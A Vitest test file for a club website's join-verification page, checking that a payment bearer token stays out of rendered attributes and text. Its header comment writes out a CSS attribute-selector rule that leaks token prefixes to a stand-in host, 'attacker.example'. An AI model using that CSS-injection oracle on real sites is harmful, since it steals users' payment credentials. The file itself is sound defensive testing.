// @vitest-environment jsdom

import "@testing-library/jest-dom/vitest";
import { render, screen, fireEvent } from "@/lib/__tests__/support/club-time-render";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { GroupJoinVerifyPageClient } from "@/app/(website-dynamic)/join/verify/[token]/group-join-verify-page-client";

/**
 * #2827 — the payment token must never reach a CSS-selectable attribute.
 *
 * `payToken` is a bearer credential for `/pay/[token]`: whoever holds it can open
 * the payment page. This page is public and renders the club's normal chrome,
 * which carries the admin-authored Raw CSS from Site Appearance, and an attribute
 * selector reads a value one character at a time:
 *
 *     a[href^="/pay/9f3a"] { background: url(https://attacker.example/9f3a); }
 *
 * So the old `<a href={`/pay/${payToken}`}>` recovery link was a payment-token
 * oracle for anyone who can edit the site's styling — and a content/styling
 * administrator is deliberately not inside the payment-token trust boundary.
 *
 * The fix keeps the token in JavaScript only. These tests pin BOTH halves of that,
 * because either one alone is satisfiable by a broken page: navigation still
 * reaching the right `/pay/[token]` address, AND the token being absent from every
 * rendered attribute and from the visible text.
 *
 * Note what is deliberately NOT asserted: nothing here requires a no-JavaScript
 * fallback. Reaching the success state at all requires the Confirm button's
 * `fetch`, and only that response carries the token, so the link this replaces was
 * never reachable without JavaScript.
 */

/**
 * A realistic 64-hex action token (the shape `issueActionToken` mints), with no
 * repeating run, so a short prefix of it is distinctive enough that finding one in
 * an attribute means a real leak rather than a coincidental class-name collision.
 */
const PAY_TOKEN =
  "e7c1b93a5d0f4826" + "1af74c02be95d738" + "6b0d2e8149a3fc57" + "d4938e6017c2ba5f";

/** The shortest prefix an attacker needs to start a working `^=` oracle. */
const OracleProbeLength = 6;

const club = {
  name: "Alpine Club",
  lodgeName: "The Lodge",
} as unknown as Parameters<typeof GroupJoinVerifyPageClient>[0]["club"];

let navigatedTo: string[] = [];
const originalLocation = window.location;

function createdResponse(payToken: string) {
  return new Response(
    JSON.stringify({
      outcome: "created",
      payToken,
      priceCents: 12_500,
      checkIn: "2026-08-01",
      checkOut: "2026-08-03",
      guestCount: 2,
    }),
    { status: 200, headers: { "Content-Type": "application/json" } },
  );
}

let verifyResponse: () => Response;

beforeEach(() => {
  navigatedTo = [];
  verifyResponse = () => createdResponse(PAY_TOKEN);
  global.fetch = vi.fn(async () => verifyResponse()) as unknown as typeof fetch;
  // jsdom cannot navigate, and the component assigns `window.location.href`.
  // Replacing the whole object with a recording stub is the house pattern here
  // (see login-form-landing.test.tsx) and it also leaves the "created" screen
  // mounted — which is exactly the redirect-failed state this suite inspects.
  Object.defineProperty(window, "location", {
    configurable: true,
    writable: true,
    value: {
      get href() {
        return navigatedTo[navigatedTo.length - 1] ?? "";
      },
      set href(value: string) {
        navigatedTo.push(value);
      },
    },
  });
});

afterEach(() => {
  Object.defineProperty(window, "location", {
    configurable: true,
    writable: true,
    value: originalLocation,
  });
  vi.restoreAllMocks();
});

/** Every attribute value in the rendered tree, root element included. */
function everyAttributeValue(root: Element): { name: string; value: string }[] {
  const elements = [root, ...Array.from(root.querySelectorAll("*"))];
  return elements.flatMap((element) =>
    Array.from(element.attributes).map((attribute) => ({
      name: `<${element.tagName.toLowerCase()} ${attribute.name}>`,
      value: attribute.value,
    })),
  );
}

async function confirmAndReachSuccess() {
  const { container } = render(
    <GroupJoinVerifyPageClient club={club} token={"a".repeat(64)} />,
  );
  fireEvent.click(
    screen.getByRole("button", { name: /Confirm and continue to payment/i }),
  );
  await screen.findByText(/Your spot is reserved/i);
  return container;
}

describe("GroupJoinVerifyPageClient — payment token stays out of the markup (#2827)", () => {
  it("still navigates automatically to the correct /pay/[token] page", async () => {
    await confirmAndReachSuccess();

    // The money path itself is unchanged: same destination, same encoding.
    expect(navigatedTo).toEqual([`/pay/${encodeURIComponent(PAY_TOKEN)}`]);
  });

  it("puts the token in NO rendered attribute — not even a probe-length prefix", async () => {
    const container = await confirmAndReachSuccess();

    const probe = PAY_TOKEN.slice(0, OracleProbeLength);
    for (const attribute of everyAttributeValue(container)) {
      // Asserted on the PREFIX, not the whole token. Exfiltration is
      // prefix-by-prefix, so an attribute holding the first few characters
      // already hands an attacker a working `^=` oracle to extend.
      expect(
        attribute.value,
        `${attribute.name} carries the payment token`,
      ).not.toContain(probe);
    }
  });

  it("does not render the token as page text either, raw or URL-encoded", async () => {
    const container = await confirmAndReachSuccess();

    expect(container.innerHTML).not.toContain(PAY_TOKEN);
    expect(container.innerHTML).not.toContain(encodeURIComponent(PAY_TOKEN));
    expect(container.textContent ?? "").not.toContain(
      PAY_TOKEN.slice(0, OracleProbeLength),
    );
  });

  it("hides a percent-encoding token from the markup in BOTH forms", async () => {
    // The realistic token is hex, where the raw and encoded forms are identical —
    // so on its own it cannot show that the encoded form was checked. A token with
    // a reserved character makes the two forms differ and pins both.
    const awkward = `${PAY_TOKEN.slice(0, 32)}/+ ?${PAY_TOKEN.slice(32)}`;
    verifyResponse = () => createdResponse(awkward);

    const container = await confirmAndReachSuccess();

    expect(navigatedTo).toEqual([`/pay/${encodeURIComponent(awkward)}`]);
    expect(container.innerHTML).not.toContain(awkward);
    expect(container.innerHTML).not.toContain(encodeURIComponent(awkward));
  });

  it("offers the redirect-failure control as a button, with no token-bearing link", async () => {
    const container = await confirmAndReachSuccess();

    // The recovery affordance survives the fix — a visitor whose automatic
    // redirect did not fire still has a way through to payment.
    const control = screen.getByRole("button", { name: "continue to payment" });
    expect(control.tagName).toBe("BUTTON");
    expect(control).not.toHaveAttribute("href");

    // And no anchor anywhere points at the payment flow, which is the shape the
    // old code used and the shape a future edit would most plausibly reintroduce.
    const payLinks = Array.from(container.querySelectorAll("a[href]")).filter(
      (anchor) => (anchor.getAttribute("href") ?? "").includes("/pay/"),
    );
    expect(payLinks).toHaveLength(0);
  });

  it("navigates from the manual control using the in-memory token", async () => {
    await confirmAndReachSuccess();
    navigatedTo.length = 0;

    fireEvent.click(screen.getByRole("button", { name: "continue to payment" }));

    expect(navigatedTo).toEqual([`/pay/${encodeURIComponent(PAY_TOKEN)}`]);
  });

  it("shows no payment control at all when the response carried no token", async () => {
    verifyResponse = () =>
      new Response(JSON.stringify({ outcome: "created", priceCents: 12_500 }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });

    await confirmAndReachSuccess();

    expect(navigatedTo).toEqual([]);
    expect(
      screen.queryByRole("button", { name: "continue to payment" }),
    ).not.toBeInTheDocument();
  });
});
